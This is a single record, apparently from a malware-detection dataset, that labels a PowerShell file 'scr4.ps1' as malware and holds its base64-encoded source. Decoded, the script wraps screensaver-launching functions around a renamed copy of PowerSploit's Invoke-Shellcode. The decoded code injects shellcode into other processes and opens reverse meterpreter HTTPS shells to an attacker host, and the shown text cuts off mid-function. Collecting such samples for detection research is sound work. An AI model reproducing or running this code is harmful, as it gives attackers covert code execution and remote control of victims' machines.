scr4.ps1,e2c80c941f217fc1b6ed37b3f9a2ca55,Scan result is 32768. IsMalware: 1,ZnVuY3Rpb24gYQp7CnN0YXJ0ICRlbnY6V0lORElSL1N5c3RlbTMyL1JpYmJvbnMuc2NyIC9zCn0KZnVuY3Rpb24gYgp7CnN0YXJ0ICRlbnY6V0lORElSL1N5c3RlbTMyL3NzVGV4dDNkLnNjciAvcwp9CmZ1bmN0aW9uIGMKewpzdGFydCAkZW52OldJTkRJUi9TeXN0ZW0zMi9NeXN0aWZ5LnNjciAvcwp9CmZ1bmN0aW9uIGQKewpzdGFydCAkZW52OldJTkRJUi9TeXN0ZW0zMi9CdWJibGVzLnNjciAvcwp9CmZ1bmN0aW9uIGUKewpzdGFydCAkZW52OldJTkRJUi9TeXN0ZW0zMi9QaG90b1NjcmVlbnNhdmVyLnNjciAvcwp9CmZ1bmN0aW9uIGYKewpzdGFydCAkZW52OldJTkRJUi9TeXN0ZW0zMi9zY3Juc2F2ZS5zY3IgL3MKfQpmdW5jdGlvbiBzaGVsbAp7CjwjCi5TWU5PUFNJUwoKSW5qZWN0IHNoZWxsY29kZSBpbnRvIHRoZSBwcm9jZXNzIElEIG9mIHlvdXIgY2hvb3Npbmcgb3Igd2l0aGluIHRoZSBjb250ZXh0IG9mIHRoZSBydW5uaW5nIFBvd2VyU2hlbGwgcHJvY2Vzcy4KClBvd2VyU3Bsb2l0IEZ1bmN0aW9uOiBzaGVsbApBdXRob3I6IE1hdHRoZXcgR3JhZWJlciAoQG1hdHRpZmVzdGF0aW9uKQpMaWNlbnNlOiBCU0QgMy1DbGF1c2UKUmVxdWlyZWQgRGVwZW5kZW5jaWVzOiBOb25lCk9wdGlvbmFsIERlcGVuZGVuY2llczogTm9uZQogCi5ERVNDUklQVElPTgoKUG9ydGlvbnMgb2YgdGhpcyBwcm9qZWN0IHdhcyBiYXNlZCB1cG9uIHN5cmluZ2UuYyB2MS4yIHdyaXR0ZW4gYnkgU3BlbmNlciBNY0ludHlyZQoKUG93ZXJTaGVsbCBleHBlY3RzIHNoZWxsY29kZSB0byBiZSBpbiB0aGUgZm9ybSAweFhYLDB4WFgsMHhYWC4gVG8gZ2VuZXJhdGUgeW91ciBzaGVsbGNvZGUgaW4gdGhpcyBmb3JtLCB5b3UgY2FuIHVzZSB0aGlzIGNvbW1hbmQgZnJvbSB3aXRoaW4gQmFja3RyYWNrIChUaGFua3MsIE1hdHQgYW5kIGcwdG0xbGspOgoKbXNmUGwgd2luZG93cy9leGVjIENNRD0iY21kIC9rIGNhbGMiIEVYSVRGVU5DPXRocmVhZCBDIHwgc2VkICcxLDZkO3MvWyI7XS8vZztzL1xcLywwL2cnIHwgdHIgLWQgJ1xuJyB8IGN1dCAtYzItIAoKTWFrZSBzdXJlIHRvIHNwZWNpZnkgJ3RocmVhZCcgZm9yIHlvdXIgZXhpdCBwcm9jZXNzLiBBbHNvLCBkb24ndCBib3RoZXIgZW5jb2RpbmcgeW91ciBzaGVsbGNvZGUuIEl0J3MgZW50aXJlbHkgdW5uZWNlc3NhcnkuCiAKLlBBUkFNRVRFUiBQcm9jZXNzSUQKClByb2Nlc3MgSUQgb2YgdGhlIHByb2Nlc3MgeW91IHdhbnQgdG8gaW5qZWN0IHNoZWxsY29kZSBpbnRvLgoKLlBBUkFNRVRFUiBTaGVsbGNvZGUKClNwZWNpZmllcyBhbiBvcHRpb25hbCBzaGVsbGNvZGUgcGFzc2VkIGluIGFzIGEgYnl0ZSBhcnJheQoKLlBBUkFNRVRFUiBMaXN0TWV0YXNwbG9pdFBscwoKTGlzdHMgYWxsIG9mIHRoZSBhdmFpbGFibGUgTWV0YXNwbG9pdCBQbHMgdGhhdCBzaGVsbCBzdXBwb3J0cwoKLlBBUkFNRVRFUiBICgpTcGVjaWZpZXMgdGhlIElQIGFkZHJlc3Mgb2YgdGhlIGF0dGFjayBtYWNoaW5lIHdhaXRpbmcgdG8gcmVjZWl2ZSB0aGUgcmV2ZXJzZSBzaGVsbAoKLlBBUkFNRVRFUiBPIApTcGVjaWZpZXMgdGhlIHBvcnQgb2YgdGhlIGF0dGFjayBtYWNoaW5lIHdhaXRpbmcgdG8gcmVjZWl2ZSB0aGUgcmV2ZXJzZSBzaGVsbAoKLlBBUkFNRVRFUiBQbAoKU3BlY2lmaWVzIHRoZSBtZXRhc3Bsb2l0IFBsIHRvIHVzZS4gQ3VycmVudGx5LCBvbmx5ICd3aW5kb3dzL21ldGVycHJldGVyL3JldmVyc2VfaHR0cCcgYW5kICdyX2h0dHBzJyBQbHMgYXJlIHN1cHBvcnRlZC4KCi5QQVJBTUVURVIgVXNlckFnZW50CgpPcHRpb25hbGx5IHNwZWNpZmllcyB0aGUgdXNlciBhZ2VudCB0byB1c2Ugd2hlbiB1c2luZyBtZXRlcnByZXRlciBodHRwIG9yIGh0dHBzIFBscwoKLlBBUkFNRVRFUiBGb3JjZQoKSW5qZWN0cyBzaGVsbGNvZGUgd2l0aG91dCBwcm9tcHRpbmcgZm9yIGNvbmZpcm1hdGlvbi4gQnkgZGVmYXVsdCwgc2hlbGwgcHJvbXB0cyBmb3IgY29uZmlybWF0aW9uIGJlZm9yZSBwZXJmb3JtaW5nIGFueSBtYWxpY2lvdXMgYWN0LgoKLkVYQU1QTEUKCkM6XFBTPiBzaGVsbCAtUHJvY2Vzc0lkIDQyNzQKCkRlc2NyaXB0aW9uCi0tLS0tLS0tLS0tCkluamVjdCBzaGVsbGNvZGUgaW50byBwcm9jZXNzIElEIDQyNzQuCgouRVhBTVBMRQoKQzpcUFM+IHNoZWxsCgpEZXNjcmlwdGlvbgotLS0tLS0tLS0tLQpJbmplY3Qgc2hlbGxjb2RlIGludG8gdGhlIHJ1bm5pbmcgaW5zdGFuY2Ugb2YgUG93ZXJTaGVsbC4KCi5FWEFNUExFCgpDOlxQUz4gU3RhcnQtUHJvY2VzcyBDOlxXaW5kb3dzXFN5c1dPVzY0XG5vdGVwYWQuZXhlIC1XaW5kb3dTdHlsZSBIaWRkZW4KQzpcUFM+ICRQcm9jID0gR2V0LVByb2Nlc3Mgbm90ZXBhZApDOlxQUz4gc2hlbGwgLVByb2Nlc3NJZCAkUHJvYy5JZCAtUGwgcl9odHRwcyAtSCAxOTIuMTY4LjMwLjEyOSAtTyA0NDMgLVZlcmJvc2UKClZFUkJPU0U6IFJlcXVlc3RpbmcgbWV0ZXJwcmV0ZXIgUGwgZnJvbSBodHRwczovLzE5Mi4xNjguMzAuMTI5OjQ0My9JTklUTQpWRVJCT1NFOiBJbmplY3Rpbmcgc2hlbGxjb2RlIGludG8gUElEOiA0MDA0ClZFUkJPU0U6IEluamVjdGluZyBpbnRvIGEgV293NjQgcHJvY2Vzcy4KVkVSQk9TRTogVXNpbmcgMzItYml0IHNoZWxsY29kZS4KVkVSQk9TRTogU2hlbGxjb2RlIG1lbW9yeSByZXNlcnZlZCBhdCAweDAzQkUwMDAwClZFUkJPU0U6IEVtaXR0aW5nIDMyLWJpdCBhc3NlbWJseSBjYWxsIHN0dWIuClZFUkJPU0U6IFRocmVhZCBjYWxsIHN0dWIgbWVtb3J5IHJlc2VydmVkIGF0IDB4MDAxQjAwMDAKVkVSQk9TRTogU2hlbGxjb2RlIGluamVjdGlvbiBjb21wbGV0ZSEKCkRlc2NyaXB0aW9uCi0tLS0tLS0tLS0tCkVzdGFibGlzaGVzIGEgcmV2ZXJzZSBodHRwcyBtZXRlcnByZXRlciBQbCBmcm9tIHdpdGhpbiB0aGUgaGlkZGVuIG5vdGVwYWQgcHJvY2Vzcy4gQSBtdWx0aS1oYW5kbGVyIHdhcyBzZXQgdXAgd2l0aCB0aGUgZm9sbG93aW5nIG9wdGlvbnM6CgpQbCBvcHRpb25zIChyX2h0dHBzKToKCk5hbWUgICAgICBDdXJyZW50IFNldHRpbmcgIFJlcXVpcmVkICBEZXNjcmlwdGlvbgotLS0tICAgICAgLS0tLS0tLS0tLS0tLS0tICAtLS0tLS0tLSAgLS0tLS0tLS0tLS0KRVhJVEZVTkMgIHRocmVhZCAgICAgICAgICAgeWVzICAgICAgIEV4aXQgdGVjaG5pcXVlOiBzZWgsIHRocmVhZCwgcHJvY2Vzcywgbm9uZQpIICAgICAxOTIuMTY4LjMwLjEyOSAgIHllcyAgICAgICBUaGUgbG9jYWwgbGlzdGVuZXIgaG9zdG5hbWUKTyAgICAgNDQzICAgICAgICAgICAgICB5ZXMgICAgICAgVGhlIGxvY2FsIGxpc3RlbmVyIHBvcnQKCi5FWEFNUExFCgpDOlxQUz4gc2hlbGwgLVBsIHJfaHR0cHMgLUggMTkyLjE2OC4zMC4xMjkgLU8gODAKCkRlc2NyaXB0aW9uCi0tLS0tLS0tLS0tCkVzdGFibGlzaGVzIGEgcmV2ZXJzZSBodHRwIG1ldGVycHJldGVyIFBsIGZyb20gd2l0aGluIHRoZSBydW5uaW5nIFB3ZXJTaGVsbCBwcm9jZXNzLiBBIG11bHRpLWhhbmRsZXIgd2FzIHNldCB1cCB3aXRoIHRoZSBmb2xsb3dpbmcgb3B0aW9uczoKClBsIG9wdGlvbnMgKHdpbmRvd3MvbWV0ZXJwcmV0ZXIvcmV2ZXJzZV9odHRwKToKCk5hbWUgICAgICBDdXJyZW50IFNldHRpbmcgIFJlcXVpcmVkICBEZXNjcmlwdGlvbgotLS0tICAgICAgLS0tLS0tLS0tLS0tLS0tICAtLS0tLS0tLSAgLS0tLS0tLS0tLS0KRVhJVEZVTkMgIHRocmVhZCAgICAgICAgICAgeWVzICAgICAgIEV4aXQgdGVjaG5pcXVlOiBzZWgsIHRocmVhZCwgcHJvY2Vzcywgbm9uZQpIICAgICAxOTIuMTY4LjMwLjEyOSAgIHllcyAgICAgICBUaGUgbG9jYWwgbGlzdGVuZXIgaG9zdG5hbWUKTyAgICAgODAgICAgICAgICAgICAgICB5ZXMgICAgICAgVGhlIGxvY2FsIGxpc3RlbmVyIHBvcnQKCi5FWEFNUExFCgpDOlxQUz4gc2hlbGwgLVNoZWxsY29kZSBAKDB4OTAsMHg5MCwweEMzKQogICAgCkRlc2NyaXB0aW9uCi0tLS0tLS0tLS0tCk92ZXJyaWRlcyB0aGUgc2hlbGxjb2RlIGluY2x1ZGVkIGluIHRoZSBzY3JpcHQgd2l0aCBjdXN0b20gc2hlbGxjb2RlIC0gMHg5MCAoTk9QKSwgMHg5MCAoTk9QKSwgMHhDMyAoUkVUKQpXYXJuaW5nOiBUaGlzIHNjcmlwdCBoYXMgbm8gd2F5IHRvIHZhbGlkYXRlIHRoYXQgeW91ciBzaGVsbGNvZGUgaXMgMzIgdnMuIDY0LWJpdCEKICAgIAouRVhBTVBMRQoKQzpcUFM+IHNoZWxsIC1MaXN0TWV0YXNwbG9pdFBscwogICAgClBscwotLS0tLS0tLQp3aW5kb3dzL21ldGVycHJldGVyL3JldmVyc2VfaHR0cApyX2h0dHBzCgouTk9URVMKClVzZSB0aGUgJy1WZXJib3NlJyBvcHRpb24gdG8gcHJpbnQgZGV0YWlsZWQgaW5mb3JtYXRpb24uCgpQbGFjZSB5b3VyIGdlbmVyYXRlZCBzaGVsbGNvZGUgaW4gJFNoZWxsY29kZTMyIGFuZCAkU2hlbGxjb2RlNjQgdmFyaWFibGVzIG9yIHBhc3MgaXQgaW4gYXMgYSBieXRlIGFycmF5IHZpYSB0aGUgJy1TaGVsbGNvZGUnIHBhcmFtZXRlcgoKQmlnIHRoYW5rcyB0byBPaXNpbiAoeDBuKSBHcmVoYW4gKEBvaXNpbmcpIGZvciBhbnN3ZXJpbmcgYWxsIG15IG9ic2N1cmUgcXVlc3Rpb25zIGF0IHRoZSBkcm9wIG9mIGEgaGF0IC0gaHR0cDovL3d3dy5uaXZvdC5vcmcvCgouTElOSwoKaHR0cDovL3d3dy5leHBsb2l0LW1vbmRheS5jb20KIz4KCltDbWRsZXRCaW5kaW5nKCBEZWZhdWx0UGFyYW1ldGVyU2V0TmFtZSA9ICdSdW5Mb2NhbCcsIFN1cHBvcnRzU2hvdWxkUHJvY2VzcyA9ICRUcnVlICwgQ29uZmlybUltcGFjdCA9ICdIaWdoJyldIFBhcmFtICgKICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICBbVUludDE2XQogICAgJFByb2Nlc3NJRCwKICAgIAogICAgW1BhcmFtZXRlciggUGFyYW1ldGVyU2V0TmFtZSA9ICdSdW5Mb2NhbCcgKV0KICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICBbQnl0ZVtdXQogICAgJFNoZWxsY29kZSwKICAgIAogICAgW1BhcmFtZXRlciggUGFyYW1ldGVyU2V0TmFtZSA9ICdNZXRhc3Bsb2l0JyApXQogICAgW1ZhbGlkYXRlU2V0KCAnd2luZG93cy9tZXRlcnByZXRlci9yZXZlcnNlX2h0dHAnLAogICAgICAgICAgICAgICAgICAncl9odHRwcycsCiAgICAgICAgICAgICAgICAgIElnbm9yZUNhc2UgPSAkVHJ1ZSApXQogICAgW1N0cmluZ10KICAgICRQbCA9ICd3aW5kb3dzL21ldGVycHJldGVyL3JldmVyc2VfaHR0cCcsCiAgICAKICAgIFtQYXJhbWV0ZXIoIFBhcmFtZXRlclNldE5hbWUgPSAnTGlzdFBscycgKV0KICAgIFtTd2l0Y2hdCiAgICAkTGlzdE1ldGFzcGxvaXRQbHMsCiAgICAKICAgIFtQYXJhbWV0ZXIoIE1hbmRhdG9yeSA9ICRUcnVlLAogICAgICAgICAgICAgICAgUGFyYW1ldGVyU2V0TmFtZSA9ICdNZXRhc3Bsb2l0JyApXQogICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgIFtTdHJpbmddCiAgICAkSCA9ICcxMjcuMC4wLjEnLAogICAgCiAgICBbUGFyYW1ldGVyKCBNYW5kYXRvcnkgPSAkVHJ1ZSwKICAgICAgICAgICAgICAgIFBhcmFtZXRlclNldE5hbWUgPSAnTWV0YXNwbG9pdCcgKV0KICAgIFtWYWxpZGF0ZVJhbmdlKCAxLDY1NTM1ICldCiAgICBbSW50XQogICAgJE8gPSA4NDQzLAogICAgCiAgICBbUGFyYW1ldGVyKCBQYXJhbWV0ZXJTZXROYW1lID0gJ01ldGFzcGxvaXQnICldCiAgICBbVmFsaWRhdGVOb3ROdWxsKCldCiAgICBbU3RyaW5nXQogICAgJFVzZXJBZ2VudCA9ICdNb3ppbGxhLzUuMCAoY29tcGF0aWJsZTsgTVNJRSA5LjA7IFdpbmRvd3MgTlQgNi4xOyBUcmlkZW50LzUuMCknLAogICAgCiAgICBbU3dpdGNoXQogICAgJEZvcmNlID0gJEZhbHNlCikKCiAgICBTZXQtU3RyaWN0TW9kZSAtVmVyc2lvbiAyLjAKICAgIAogICAgIyBMaXN0IGFsbCBhdmFpbGFibGUgTWV0YXNwbG9pdCBQbHMgYW5kIGV4aXQgdGhlIGZ1bmN0aW9uCiAgICBpZiAoJFBzQ21kbGV0LlBhcmFtZXRlclNldE5hbWUgLWVxICdMaXN0UGxzJykKICAgIHsKICAgICAgICAkQXZhaWxhYmxlUGxzID0gKEdldC1Db21tYW5kIHNoZWxsKS5QYXJhbWV0ZXJzWydQbCddLkF0dHJpYnV0ZXMgfAogICAgICAgICAgICBXaGVyZS1PYmplY3QgeyRfLlR5cGVJZCAtZXEgW1N5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uVmFsaWRhdGVTZXRBdHRyaWJ1dGVdfQogICAgCiAgICAgICAgZm9yZWFjaCAoJFBsIGluICRBdmFpbGFibGVQbHMuVmFsaWRWYWx1ZXMpCiAgICAgICAgewogICAgICAgICAgICBOZXctT2JqZWN0IFBTT2JqZWN0IC1Qcm9wZXJ0eSBAeyBQbHMgPSAkUGwgfQogICAgICAgIH0KICAgICAgICAKICAgICAgICBSZXR1cm4KICAgIH0KCiAgICBpZiAoICRQU0JvdW5kUGFyYW1ldGVyc1snUHJvY2Vzc0lEJ10gKQogICAgewogICAgICAgICMgRW5zdXJlIGEgdmFsaWQgcHJvY2VzcyBJRCB3YXMgcHJvdmlkZWQKICAgICAgICAjIFRoaXMgY291bGQgaGF2ZSBiZWVuIHZhbGlkYXRlZCB2aWEgJ1ZhbGlkYXRlU2NyaXB0JyBidXQgdGhlIGVycm9yIGdlbmVyYXRlZCB3aXRoIEdldC1Qcm9jZXNzIGlzIG1vcmUgZGVzY3JpcHRpdmUKICAgICAgICBHZXQtUHJvY2VzcyAtSWQgJFByb2Nlc3NJRCAtRXJyb3JBY3Rpb24gU3RvcCB8IE91dC1OdWxsCiAgICB9CiAgICAKICAgIGZ1bmN0aW9uIExvY2FsOkdldC1EZWxlZ2F0ZVR5cGUKICAgIHsKICAgICAgICBQYXJhbQogICAgICAgICgKICAgICAgICAgICAgW091dHB1dFR5cGUoW1R5cGVdKV0KICAgICAgICAgICAgCiAgICAgICAgICAgIFtQYXJhbWV0ZXIoIFBvc2l0aW9uID0gMCldCiAgICAgICAgICAgIFtUeXBlW11dCiAgICAgICAgICAgICRQYXJhbWV0ZXJzID0gKE5ldy1PYmplY3QgVHlwZVtdKDApKSwKICAgICAgICAgICAgCiAgICAgICAgICAgIFtQYXJhbWV0ZXIoIFBvc2l0aW9uID0gMSApXQogICAgICAgICAgICBbVHlwZV0KICAgICAgICAgICAgJFJldHVyblR5cGUgPSBbVm9pZF0KICAgICAgICApCgogICAgICAgICREb21haW4gPSBbQXBwRG9tYWluXTo6Q3VycmVudERvbWFpbgogICAgICAgICREeW5Bc3NlbWJseSA9IE5ldy1PYmplY3QgU3lzdGVtLlJlZmxlY3Rpb24uQXNzZW1ibHlOYW1lKCdSZWZsZWN0ZWREZWxlZ2F0ZScpCiAgICAgICAgJEFzc2VtYmx5QnVpbGRlciA9ICREb21haW4uRGVmaW5lRHluYW1pY0Fzc2VtYmx5KCREeW5Bc3NlbWJseSwgW1N5c3RlbS5SZWZsZWN0aW9uLkVtaXQuQXNzZW1ibHlCdWlsZGVyQWNjZXNzXTo6UnVuKQogICAgICAgICRNb2R1bGVCdWlsZGVyID0gJEFzc2VtYmx5QnVpbGRlci5EZWZpbmVEeW5hbWljTW9kdWxlKCdJbk1lbW9yeU1vZHVsZScsICRmYWxzZSkKICAgICAgICAkVHlwZUJ1aWxkZXIgPSAkTW9kdWxlQnVpbGRlci5EZWZpbmVUeXBlKCdNeURlbGVnYXRlVHlwZScsICdDbGFzcywgUHVibGljLCBTZWFsZWQsIEFuc2lDbGFzcywgQXV0b0NsYXNzJywgW1N5c3RlbS5NdWx0aWNhc3REZWxlZ2F0ZV0pCiAgICAgICAgJENvbnN0cnVjdG9yQnVpbGRlciA9ICRUeXBlQnVpbGRlci5EZWZpbmVDb25zdHJ1Y3RvcignUlRTcGVjaWFsTmFtZSwgSGlkZUJ5U2lnLCBQdWJsaWMnLCBbU3lzdGVtLlJlZmxlY3Rpb24uQ2FsbGluZ0NvbnZlbnRpb25zXTo6U3RhbmRhcmQsICRQYXJhbWV0ZXJzKQogICAgICAgICRDb25zdHJ1Y3RvckJ1aWxkZXIuU2V0SW1wbGVtZW50YXRpb25GbGFncygnUnVudGltZSwgTWFuYWdlZCcpCiAgICAgICAgJE1ldGhvZEJ1aWxkZXIgPSAkVHlwZUJ1aWxkZXIuRGVmaW5lTWV0aG9kKCdJbnZva2UnLCAnUHVibGljLCBIaWRlQnlTaWcsIE5ld1Nsb3QsIFZpcnR1YWwnLCAkUmV0dXJuVHlwZSwgJFBhcmFtZXRlcnMpCiAgICAgICAgJE1ldGhvZEJ1aWxkZXIuU2V0SW1wbGVtZW50YXRpb25GbGFncygnUnVudGltZSwgTWFuYWdlZCcpCiAgICAgICAgCiAgICAgICAgV3JpdGUtT3V0cHV0ICRUeXBlQnVpbGRlci5DcmVhdGVUeXBlKCkKICAgIH0KCiAgICBmdW5jdGlvbiBMb2NhbDpHZXQtUHJvY0FkZHJlc3MKICAgIHsKICAgICAgICBQYXJhbQogICAgICAgICgKICAgICAgICAgICAgW091dHB1dFR5cGUoW0ludFB0cl0pXQogICAgICAgIAogICAgICAgICAgICBbUGFyYW1ldGVyKCBQb3NpdGlvbiA9IDAsIE1hbmRhdG9yeSA9ICRUcnVlICldCiAgICAgICAgICAgIFtTdHJpbmddCiAgICAgICAgICAgICRNb2R1bGUsCiAgICAgICAgICAgIAogICAgICAgICAgICBbUGFyYW1ldGVyKCBQb3NpdGlvbiA9IDEsIE1hbmRhdG9yeSA9ICRUcnVlICldCiAgICAgICAgICAgIFtTdHJpbmddCiAgICAgICAgICAgICRQcm9jZWR1cmUKICAgICAgICApCgogICAgICAgICMgR2V0IGEgcmVmZXJlbmNlIHRvIFN5c3RlbS5kbGwgaW4gdGhlIEdBQwogICAgICAgICRTeXN0ZW1Bc3NlbWJseSA9IFtBcHBEb21haW5dOjpDdXJyZW50RG9tYWluLkdldEFzc2VtYmxpZXMoKSB8CiAgICAgICAgICAgIFdoZXJlLU9iamVjdCB7ICRfLkdsb2JhbEFzc2VtYmx5Q2FjaGUgLUFuZCAkXy5Mb2NhdGlvbi5TcGxpdCgnXFwnKVstMV0uRXF1YWxzKCdTeXN0ZW0uZGxsJykgfQogICAgICAgICRVbnNhZmVOYXRpdmVNZXRob2RzID0gJFN5c3RlbUFzc2VtYmx5LkdldFR5cGUoJ01pY3Jvc29mdC5XaW4zMi5VbnNhZmVOYXRpdmVNZXRob2RzJykKICAgICAgICAjIEdldCBhIHJlZmVyZW5jZSB0byB0aGUgR2V0TW9kdWxlSGFuZGxlIGFuZCBHZXRQcm9jQWRkcmVzcyBtZXRob2RzCiAgICAgICAgJEdldE1vZHVsZUhhbmRsZSA9ICRVbnNhZmVOYXRpdmVNZXRob2RzLkdldE1ldGhvZCgnR2V0TW9kdWxlSGFuZGxlJykKICAgICAgICAkR2V0UHJvY0FkZHJlc3MgPSAkVW5zYWZlTmF0aXZlTWV0aG9kcy5HZXRNZXRob2QoJ0dldFByb2NBZGRyZXNzJykKICAgICAgICAjIEdldCBhIGhhbmRsZSB0byB0aGUgbW9kdWxlIHNwZWNpZmllZAogICAgICAgICRLZXJuMzJIYW5kbGUgPSAkR2V0TW9kdWxlSGFuZGxlLkludm9rZSgkbnVsbCwgQCgkTW9kdWxlKSkKICAgICAgICAkdG1wUHRyID0gTmV3LU9iamVjdCBJbnRQdHIKICAgICAgICAkSGFuZGxlUmVmID0gTmV3LU9iamVjdCBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuSGFuZGxlUmVmKCR0bXBQdHIsICRLZXJuMzJIYW5kbGUpCiAgICAgICAgCiAgICAgICAgIyBSZXR1cm4gdGhlIGFkZHJlc3Mgb2YgdGhlIGZ1bmN0aW9uCiAgICAgICAgV3JpdGUtT3V0cHV0ICRHZXRQcm9jQWRkcmVzcy5JbnZva2UoJG51bGwsIEAoW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5IYW5kbGVSZWZdJEhhbmRsZVJlZiwgJFByb2NlZHVyZSkpCiAgICB9CgogICAgIyBFbWl0cyBhIHNoZWxsY29kZSBzdHViIHRoYXQgd2hlbiBpbmplY3RlZCB3aWxsIGNyZWF0ZSBhIHRocmVhZCBhbmQgcGFzcyBleGVjdXRpb24gdG8gdGhlIG1haW4gc2hlbGxjb2RlIFBsCiAgICBmdW5jdGlvbiBMb2NhbDpFbWl0LUNhbGxUaHJlYWRTdHViIChbSW50UHRyXSAkQmFzZUFkZHIsIFtJbnRQdHJdICRFeGl0VGhyZWFkQWRkciwgW0ludF0gJEFyY2hpdGVjdHVyZSkKICAgIHsKICAgICAgICAkSW50U2l6ZVB0ciA9ICRBcmNoaXRlY3R1cmUgLyA4CgogICAgICAgIGZ1bmN0aW9uIExvY2FsOkNvbnZlcnRUby1MaXR0bGVFbmRpYW4gKFtJbnRQdHJdICRBZGRyZXNzKQogICAgICAgIHsKICAgICAgICAgICAgJExpdHRsZUVuZGlhbkJ5dGVBcnJheSA9IE5ldy1PYmplY3QgQnl0ZVtdKDApCiAgICAgICAgICAgICRBZGRyZXNzLlRvU3RyaW5nKCJYJCgkSW50U2l6ZVB0cioyKSIpIC1zcGxpdCAnKFtBLUYwLTldezJ9KScgfCBGb3JFYWNoLU9iamVjdCB7IGlmICgkXykgeyAkTGl0dGxlRW5kaWFuQnl0ZUFycmF5ICs9IFtCeXRlXSAoJzB4ezB9JyAtZiAkXykgfSB9CiAgICAgICAgICAgIFtTeXN0ZW0uQXJyYXldOjpSZXZlcnNlKCRMaXR0bGVFbmRpYW5CeXRlQXJyYXkpCiAgICAgICAgICAgIAogICAgICAgICAgICBXcml0ZS1PdXRwdXQgJExpdHRsZUVuZGlhbkJ5dGVBcnJheQogICAgICAgIH0KICAgICAgICAKICAgICAgICAkQ2FsbFN0dWIgPSBOZXctT2JqZWN0IEJ5dGVbXSgwKQogICAgICAgIAogICAgICAgIGlmICgkSW50U2l6ZVB0ciAtZXEgOCkKICAgICAgICB7CiAgICAgICAgICAgIFtCeXRlW11dICRDYWxsU3R1YiA9IDB4NDgsMHhCOCAgICAgICAgICAgICAgICAgICAgICAjIE1PViAgIFFXT1JEIFJBWCwgJnNoZWxsY29kZQogICAgICAgICAgICAkQ2FsbFN0dWIgKz0gQ29udmVydFRvLUxpdHRsZUVuZGlhbiAkQmFzZUFkZHIgICAgICAgIyAmc2hlbGxjb2RlCiAgICAgICAgICAgICRDYWxsU3R1YiArPSAweEZGLDB4RDAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAjIENBTEwgIFJBWAogICAgICAgICAgICAkQ2FsbFN0dWIgKz0gMHg2QSwweDAwICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIyBQVVNIICBCWVRFIDAKICAgICAgICAgICAgJENhbGxTdHViICs9IDB4NDgsMHhCOCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICMgTU9WICAgUVdPUkQgUkFYLCAmRXhpdFRocmVhZAogICAgICAgICAgICAkQ2FsbFN0dWIgKz0gQ29udmVydFRvLUxpdHRsZUVuZGlhbiAkRXhpdFRocmVhZEFkZHIgIyAmRXhpdFRocmVhZAogICAgICAgICAgICAkQ2FsbFN0dWIgKz0gMHhGRiwweEQwICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIyBDQUxMICBSQVgKICAgICAgICB9CiAgICAgICAgZWxzZQogICAgICAgIHsKICAgICAgICAgICAgW0J5dGVbXV0gJENhbGxTdHViID0gMHhCOCAgICAgICAgICAgICAgICAgICAgICAgICAgICMgTU9WICAgRFdPUkQgRUFYLCAmc2hlbGxjb2RlCiAgICAgICAgICAgICRDYWxsU3R1YiArPSBDb252ZXJ0VG8tTGl0dGxlRW5kaWFuICRCYXNlQWRkciAgICAgICAjICZzaGVsbGNvZGUKICAgICAgICAgICAgJENhbGxTdHViICs9IDB4RkYsMHhEMCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICMgQ0FMTCAgRUFYCiAgICAgICAgICAgICRDYWxsU3R1YiArPSAweDZBLDB4MDAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAjIFBVU0ggIEJZVEUgMAogICAgICAgICAgICAkQ2FsbFN0dWIgKz0gMHhCOCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIyBNT1YgICBEV09SRCBFQVgsICZFeGl0VGhyZWFkCiAgICAgICAgICAgICRDYWxsU3R1YiArPSBDb252ZXJ0VG8tTGl0dGxlRW5kaWFuICRFeGl0VGhyZWFkQWRkciAjICZFeGl0VGhyZWFkCiAgICAgICAgICAgICRDYWxsU3R1YiArPSAweEZGLDB4RDAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAjIENBTEwgIEVBWAogICAgICAgIH0KICAgICAgICAKICAgICAgICBXcml0ZS1PdXRwdXQgJENhbGxTdHViCiAgICB9CgogICAgZnVuY3Rpb24gTG9jYWw6SW5qZWN0LVJlbW90ZVNoZWxsY29kZSAoW0ludF0gJFByb2Nlc3NJRCkKICAgIHsKICAgICAgICAjIE9wZW4gYSBoYW5kbGUgdG8gdGhlIHByb2Nlc3MgeW91IHdhbnQgdG8gaW5qZWN0IGludG8KICAgICAgICAkaFByb2Nlc3MgPSAkT3BlblByb2Nlc3MuSW52b2tlKDB4MDAxRjBGRkYsICRmYWxzZSwgJFByb2Nlc3NJRCkgIyBQcm9jZXNzQWNjZXNzRmxhZ3MuQWxsICgweDAwMUYwRkZGKQogICAgICAgIAogICAgICAgIGlmICghJGhQcm9jZXNzKQogICAgICAgIHsKICAgICAgICAgICAgVGhyb3cgIlVuYWJsZSB0byBvcGVuIGEgcHJvY2VzcyBoYW5kbGUgZm9yIFBJRDogJFByb2Nlc3NJRCIKICAgICAgICB9CgogICAgICAgICRJc1dvdzY0ID0gJGZhbHNlCgogICAgICAgIGlmICgkNjRiaXRDUFUpICMgT25seSBwZXJmb3JtIHRoZXNlcyBjaGVja3MgaWYgQ1BVIGlzIDY0LWJpdAogICAgICAgIHsKICAgICAgICAgICAgIyBEZXRlcm1pbmUgaXMgdGhlIHByb2Nlc3Mgc3BlY2lmaWVkIGlzIDMyIG9yIDY0IGJpdAogICAgICAgICAgICAkSXNXb3c2NFByb2Nlc3MuSW52b2tlKCRoUHJvY2VzcywgW1JlZl0gJElzV293NjQpIHwgT3V0LU51bGwKICAgICAgICAgICAgCiAgICAgICAgICAgIGlmICgoISRJc1dvdzY0KSAtYW5kICRQb3dlclNoZWxsMzJiaXQpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIFRocm93ICdVbmFibGUgdG8gaW5qZWN0IDY0LWJpdCBzaGVsbGNvZGUgZnJvbSB3aXRoaW4gMzItYml0IFBvd2Vyc2hlbGwuIFVzZSB0aGUgNjQtYml0IHZlcnNpb24gb2YgUG93ZXJzaGVsbCBpZiB